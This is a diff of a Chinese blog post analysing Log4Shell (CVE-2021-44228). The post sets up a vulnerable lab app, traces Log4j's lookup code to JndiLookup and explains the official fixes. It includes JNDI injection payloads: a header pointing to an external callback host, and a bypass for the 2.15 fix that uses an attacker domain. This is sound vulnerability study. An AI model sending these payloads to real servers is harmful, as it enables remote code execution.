@@ -5,19 +5,19 @@
     
     <title>Log4shell（CVE-2021-44228）调试分析 | Math &amp; Sec ，HACHp1的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="Log4shell（CVE-2021-44228）调试分析  Log4shell（CVE-2021-44228）调试分析 漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
+    <meta name="description" content="Log4shell（CVE-2021-44228）调试分析   Log4shell（CVE-2021-44228）调试分析  漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
 <meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Log4shell（CVE-2021-44228）调试分析">
 <meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20220307-log4shell.html">
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
-<meta property="og:description" content="Log4shell（CVE-2021-44228）调试分析  Log4shell（CVE-2021-44228）调试分析 漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
-<meta property="og:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
-<meta property="og:updated_time" content="2022-03-09T06:30:17.601Z">
+<meta property="og:description" content="Log4shell（CVE-2021-44228）调试分析   Log4shell（CVE-2021-44228）调试分析  漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
+<meta property="og:image" content="http://129.204.230.95/img/thumbnails/planet_red.png">
+<meta property="og:updated_time" content="2024-02-10T12:30:19.045Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Log4shell（CVE-2021-44228）调试分析">
-<meta name="twitter:description" content="Log4shell（CVE-2021-44228）调试分析  Log4shell（CVE-2021-44228）调试分析 漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
-<meta name="twitter:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
+<meta name="twitter:description" content="Log4shell（CVE-2021-44228）调试分析   Log4shell（CVE-2021-44228）调试分析  漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
+<meta name="twitter:image" content="http://129.204.230.95/img/thumbnails/planet_red.png">
     
 
     
@@ -158,7 +158,7 @@
         </div>
         <div class="article-info profile-block">
             <div class="article-info-block">
-                45
+                46
                 <span>文章</span>
             </div>
             <div class="article-info-block">
@@ -192,7 +192,7 @@
         
             
 	
-		<img src="http://159.75.52.53/img/banner/Eur2.jpg" class="article-banner" />
+		<img src="http://129.204.230.95/img/banner/Eur2.jpg" class="article-banner" />
 	
 
 
@@ -246,9 +246,11 @@
         <div class="article-entry" itemprop="articleBody">
         
             
-			<h1 id="Log4shell（CVE-2021-44228）调试分析"><a href="#Log4shell（CVE-2021-44228）调试分析" class="headerlink" title="Log4shell（CVE-2021-44228）调试分析"></a>Log4shell（CVE-2021-44228）调试分析</h1><!-- TOC -->
+			<h1 id="log4shellcve-2021-44228调试分析">Log4shell（CVE-2021-44228）调试分析</h1>
+<!-- TOC -->
 <ul>
-<li><a href="#log4shellcve-2021-44228调试分析">Log4shell（CVE-2021-44228）调试分析</a><ul>
+<li><a href="#log4shellcve-2021-44228调试分析">Log4shell（CVE-2021-44228）调试分析</a>
+<ul>
 <li><a href="#漏洞背景">漏洞背景</a></li>
 <li><a href="#环境安装">环境安装</a></li>
 <li><a href="#漏洞触发">漏洞触发</a></li>
@@ -256,21 +258,24 @@
 <li><a href="#总结">总结</a></li>
 <li><a href="#根本原因和官方修复手段">根本原因和官方修复手段</a></li>
 <li><a href="#参考资料">参考资料</a></li>
-</ul>
-</li>
+</ul></li>
 </ul>
 <!-- /TOC -->
 <a id="more"></a>
-<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>Log4j是一个应用广泛的Java日志库，为了方便开发者规定日志的格式，Log4j提供了一个能够直接通过传入记录函数的字符串来格式化日志的功能。该功能除了支持一些常见的功能（如获取时间等），还能调用到JNDI协议。JNDI协议本身是为了方便程序员在不用关注一个对象的具体位置而能获取一个数据或者对象的功能，它本身是为了方便程序员，但也易被攻击者利用，造成JNDI注入或者反序列化攻击。</p>
-<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><ul>
-<li>选择<a href="https://github.com/christophetd/log4shell-vulnerable-app" target="_blank" rel="external">Log4Shell sample vulnerable application </a>进行环境构建。为了能够远程调试，将docker中的jar中的lib引入到本地项目中。<code>docker run -p 10086:8080 -p 10087:8000 --name vulnerable-app --rm vulnerable-app</code></li>
+<h2 id="漏洞背景">漏洞背景</h2>
+<p>Log4j是一个应用广泛的Java日志库，为了方便开发者规定日志的格式，Log4j提供了一个能够直接通过传入记录函数的字符串来格式化日志的功能。该功能除了支持一些常见的功能（如获取时间等），还能调用到JNDI协议。JNDI协议本身是为了方便程序员在不用关注一个对象的具体位置而能获取一个数据或者对象的功能，它本身是为了方便程序员，但也易被攻击者利用，造成JNDI注入或者反序列化攻击。</p>
+<h2 id="环境安装">环境安装</h2>
+<ul>
+<li>选择<a href="https://github.com/christophetd/log4shell-vulnerable-app" target="_blank" rel="external">Log4Shell sample vulnerable application</a>进行环境构建。为了能够远程调试，将docker中的jar中的lib引入到本地项目中。<code>docker run -p 10086:8080 -p 10087:8000 --name vulnerable-app --rm vulnerable-app</code></li>
 <li>该项目通过<code>spring-boot-starter-log4j2:2.6.1</code>引入包含漏洞的<code>Log4j 2.14.1</code></li>
 </ul>
-<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>项目中的关键代码如下(MainController.java)：</p>
+<h2 id="漏洞触发">漏洞触发</h2>
+<p>项目中的关键代码如下(MainController.java)：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</div><div class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestHeader;</div><div class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</div><div class="line"></div><div class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</div><div class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</div><div class="line"></div><div class="line"><span class="meta">@RestController</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainController</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(<span class="string">"HelloWorld"</span>);</div><div class="line"></div><div class="line">    <span class="meta">@GetMapping</span>(<span class="string">"/"</span>)</div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(@RequestHeader(<span class="string">"X-Api-Version"</span>)</span> String apiVersion) </span>&#123;</div><div class="line">        logger.info(<span class="string">"Received a request for API version "</span> + apiVersion);</div><div class="line">        <span class="keyword">return</span> <span class="string">"Hello, world!"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>在http header中加入：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">X-Api-Version</span>: $&#123;jndi:ldap://xxxx.ceye.io&#125;</div></pre></td></tr></table></figure>
-<h2 id="漏洞跟踪过程"><a href="#漏洞跟踪过程" class="headerlink" title="漏洞跟踪过程"></a>漏洞跟踪过程</h2><p>首先通过<code>LogManager.getLogger(&quot;HelloWorld&quot;)</code>获取HelloWorld的Logger，记录的信息中可以直接触发JNDI导致的反序列化</p>
+<h2 id="漏洞跟踪过程">漏洞跟踪过程</h2>
+<p>首先通过<code>LogManager.getLogger(&quot;HelloWorld&quot;)</code>获取HelloWorld的Logger，记录的信息中可以直接触发JNDI导致的反序列化</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">logger.info(<span class="string">"Received a request for API version "</span> + apiVersion);</div></pre></td></tr></table></figure>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">(<span class="keyword">final</span> String message)</span> </span>&#123;</div><div class="line">        <span class="keyword">this</span>.logIfEnabled(FQCN, Level.INFO, (Marker)<span class="keyword">null</span>, (String)message, (Throwable)((Throwable)<span class="keyword">null</span>));</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
 <p>需要满足<code>this.isEnabled(level, marker, message, throwable)</code>：</p>
@@ -292,20 +297,20 @@
 <p>最后进入<code>org\apache\logging\log4j\core\lookup\JndiLookup.class</code>发起JNDI请求（42行）：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    var6 = Objects.toString(jndiManager.lookup(jndiName), (String)<span class="keyword">null</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>到这里整个流程分析完毕。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<h2 id="总结">总结</h2>
+<ul>
 <li>整个跟洞过程实际上就是对Log4j的format解析过程进行理解和跟踪，理解了如何递归地处理待记录信息中的语法问题等过程，就能够理解Log4shell。</li>
 </ul>
-<h2 id="根本原因和官方修复手段"><a href="#根本原因和官方修复手段" class="headerlink" title="根本原因和官方修复手段"></a>根本原因和官方修复手段</h2><ul>
+<h2 id="根本原因和官方修复手段">根本原因和官方修复手段</h2>
+<ul>
 <li>Log4j 2的日志格式化功能提供了一系列lookup的功能，支持<code>${}</code>语法，能够方便地获取系统信息等（可见<a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution" target="_blank" rel="external">Configuration</a>以及 <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="external">Lookups</a> 。这些功能中包括一个Jndi Lookup的功能，该功能能够通过日志调用Jndi，是漏洞的关键，造成攻击者能够以<code>${jndi:ldap://xxx.xxx/x}</code>的形式调用JNDI。</li>
-<li>官方给出的临时解决方法：直接删除Jndi类：<blockquote>
-<p>Otherwise, in any release other than 2.16.0, you may remove the <code>JndiLookup</code> class from the classpath: <code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></p>
-</blockquote>
-</li>
+<li>官方给出的临时解决方法：直接删除Jndi类： &gt; Otherwise, in any release other than 2.16.0, you may remove the <code>JndiLookup</code> class from the classpath: <code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></li>
 <li>修复1（对于2.10&lt;=,&lt;2.15的版本）：增加了默认设置不使用lookup功能，但这种情况仅适用于直接使用形如<code>logger.info(Untrusted_message)</code>的形式，而有的开发者需要获取和记录诸如User-agent的信息，此时必须执行变量的<code>put</code>操作并对log4j的模板（log4j2.properties文件中的设置）进行渲染，仍然会导致lookup的发生。</li>
-<li>修复2（2.15版本）：<a href="https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3" target="_blank" rel="external">Restrict LDAP access via JNDI (#608) </a>，该修复中增加了默认设置不使用lookup功能（与修复1相同）。此外还限制了LDAP的目标服务器（仅支持127的ip）和可用的类，并且对JNDI的可用协议进行了限制。但是由于对127的检测有可以绕过的方法，使用诸如<code>${jndi:ldap://127.0.0.1#a.attacker.com/a}</code>形式的payload便可以绕过（该地址虽然不合法，但攻击者可以在自己的DNS中加入该域名，同样会执行成功）</li>
+<li>修复2（2.15版本）：<a href="https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3" target="_blank" rel="external">Restrict LDAP access via JNDI (#608)</a>，该修复中增加了默认设置不使用lookup功能（与修复1相同）。此外还限制了LDAP的目标服务器（仅支持127的ip）和可用的类，并且对JNDI的可用协议进行了限制。但是由于对127的检测有可以绕过的方法，使用诸如<code>${jndi:ldap://127.0.0.1#a.attacker.com/a}</code>形式的payload便可以绕过（该地址虽然不合法，但攻击者可以在自己的DNS中加入该域名，同样会执行成功）</li>
 <li>在最新版中，该功能仅支持<code>java:</code>和无协议，不支持LDAP协议</li>
 </ul>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<h2 id="参考资料">参考资料</h2>
+<ul>
 <li><a href="https://logging.apache.org/log4j/2.x/security.html" target="_blank" rel="external">Apache Log4j Security Vulnerabilities</a></li>
 <li><a href="https://lorexxar.cn/2021/12/10/log4j2-jndi/" target="_blank" rel="external">log4j2 JNDI注入漏洞速通</a></li>
 <li><a href="https://www.youtube.com/watch?v=OS5lY3-M6tw" target="_blank" rel="external">Log4j RCE vulnerability explained with bypass for the initial fix (CVE-2021-44228, CVE-2021-45046)</a></li>
@@ -456,10 +461,29 @@
                     <li>
                         
                         <div class="item-thumbnail">
+                            <a href="/posts/杂文/20240210-thinking2.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://129.204.230.95/img/thumbnails/cat.jpg)" alt="江城子 甲辰随想" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/杂文/">杂文</a></p>
+                            <p class="item-title"><a href="/posts/杂文/20240210-thinking2.html" class="title">江城子 甲辰随想</a></p>
+                            <p class="item-date"><time datetime="2024-02-10T10:22:11.000Z" itemprop="datePublished">2024-02-10</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
                             <a href="/posts/静态分析/20220723-graph-sa-1.html" class="thumbnail">
     
     
-        <span style="background-image:url(http://159.75.52.53/img/thumbnails/planet_red.png)" alt="基于图数据库的静态分析技术初探（一）" class="thumbnail-image"></span>
+        <span style="background-image:url(http://129.204.230.95/img/thumbnails/planet_red.png)" alt="基于图数据库的静态分析技术初探（一）" class="thumbnail-image"></span>
     
 </a>
 
@@ -478,7 +502,7 @@
                             <a href="/posts/Web安全/20220414-spring4shell.html" class="thumbnail">
     
     
-        <span style="background-image:url(http://159.75.52.53/img/thumbnails/eggs.jpg)" alt="Spring4Shell简析（CVE-2022-22965）" class="thumbnail-image"></span>
+        <span style="background-image:url(http://129.204.230.95/img/thumbnails/eggs.jpg)" alt="Spring4Shell简析（CVE-2022-22965）" class="thumbnail-image"></span>
     
 </a>
 
@@ -497,7 +521,7 @@
                             <a href="/posts/Web安全/20220407-cc_analysis.html" class="thumbnail">
     
     
-        <span style="background-image:url(http://159.75.52.53/img/thumbnails/planet_red.png)" alt="Commons Collections链分析" class="thumbnail-image"></span>
+        <span style="background-image:url(http://129.204.230.95/img/thumbnails/planet_red.png)" alt="Commons Collections链分析" class="thumbnail-image"></span>
     
 </a>
 
@@ -516,7 +540,7 @@
                             <a href="/posts/Web安全/20220325-fastjson.html" class="thumbnail">
     
     
-        <span style="background-image:url(http://159.75.52.53/img/thumbnails/eggs.jpg)" alt="Fastjson 1.2.24反序列化漏洞浅析" class="thumbnail-image"></span>
+        <span style="background-image:url(http://129.204.230.95/img/thumbnails/eggs.jpg)" alt="Fastjson 1.2.24反序列化漏洞浅析" class="thumbnail-image"></span>
     
 </a>
 
@@ -529,25 +553,6 @@
                         </div>
                     </li>
                 
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/posts/Web安全/20220307-log4shell.html" class="thumbnail">
-    
-    
-        <span style="background-image:url(http://159.75.52.53/img/thumbnails/planet_red.png)" alt="Log4shell（CVE-2021-44228）调试分析" class="thumbnail-image"></span>
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"><a class="article-category-link" href="/categories/Web安全/">Web安全</a></p>
-                            <p class="item-title"><a href="/posts/Web安全/20220307-log4shell.html" class="title">Log4shell（CVE-2021-44228）调试分析</a></p>
-                            <p class="item-date"><time datetime="2022-03-07T09:33:49.000Z" itemprop="datePublished">2022-03-07</time></p>
-                        </div>
-                    </li>
-                
             </ul>
         </div>
     </div>
@@ -557,7 +562,7 @@
     <div class="widget-wrap">
         <h3 class="widget-title">标签</h3>
         <div class="widget">
-            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux日常/">Linux日常</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">18</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/对抗样本/">对抗样本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心情随笔/">心情随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习-算法/">机器学习-算法</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习初步/">机器学习初步</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/静态分析/">静态分析</a><span class="tag-list-count">1</span></li></ul>
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux日常/">Linux日常</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">18</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/对抗样本/">对抗样本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心情随笔/">心情随笔</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习-算法/">机器学习-算法</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习初步/">机器学习初步</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/静态分析/">静态分析</a><span class="tag-list-count">1</span></li></ul>
         </div>
     </div>
 
@@ -566,7 +571,7 @@
     <div class="widget-wrap">
         <h3 class="widget-title">标签云</h3>
         <div class="widget tagcloud">
-            <a href="/tags/Linux日常/" style="font-size: 11.67px;">Linux日常</a> <a href="/tags/Web安全/" style="font-size: 20px;">Web安全</a> <a href="/tags/对抗样本/" style="font-size: 10px;">对抗样本</a> <a href="/tags/心情随笔/" style="font-size: 10px;">心情随笔</a> <a href="/tags/机器学习/" style="font-size: 18.33px;">机器学习</a> <a href="/tags/机器学习-算法/" style="font-size: 15px;">机器学习-算法</a> <a href="/tags/机器学习初步/" style="font-size: 13.33px;">机器学习初步</a> <a href="/tags/漏洞分析/" style="font-size: 16.67px;">漏洞分析</a> <a href="/tags/静态分析/" style="font-size: 10px;">静态分析</a>
+            <a href="/tags/Linux日常/" style="font-size: 11.67px;">Linux日常</a> <a href="/tags/Web安全/" style="font-size: 20px;">Web安全</a> <a href="/tags/对抗样本/" style="font-size: 10px;">对抗样本</a> <a href="/tags/心情随笔/" style="font-size: 11.67px;">心情随笔</a> <a href="/tags/机器学习/" style="font-size: 18.33px;">机器学习</a> <a href="/tags/机器学习-算法/" style="font-size: 15px;">机器学习-算法</a> <a href="/tags/机器学习初步/" style="font-size: 13.33px;">机器学习初步</a> <a href="/tags/漏洞分析/" style="font-size: 16.67px;">漏洞分析</a> <a href="/tags/静态分析/" style="font-size: 10px;">静态分析</a>
         </div>
     </div>
 
@@ -607,7 +612,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy; 2023 HACHp1<br>
+            &copy; 2024 HACHp1<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
         </div>
     </div>
